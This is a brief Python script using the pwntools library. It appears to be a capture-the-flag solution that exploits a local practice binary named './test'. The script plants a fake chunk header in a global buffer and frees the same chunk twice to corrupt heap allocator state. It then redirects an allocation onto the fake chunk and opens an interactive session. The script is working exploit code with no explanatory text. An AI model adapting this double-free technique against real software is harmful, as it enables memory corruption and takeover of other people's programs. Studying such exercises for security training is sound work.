from pwn import*
p = process('./test')

### Gadget
name_addr = 0x6020b0

### Definition
def menu(sel):
	p.sendlineafter("> ",str(sel))

def write(contents):
	menu(1)
	p.sendafter('contents: ',contents)

def erase(idx):
	menu(2)
	p.sendlineafter('Index: ',str(idx))

# exploit

p.send(p64(0)+p64(0x20))	# name
write('a'*0x8)
write('b'*0x8)
write('c'*0x8)
erase(1)
erase(0)
erase(1)
write(p64(0x6020b0))
write(p64(0))
write(p64(0))

raw_input()
p.send('GREATDAY\x00')
p.interactive()
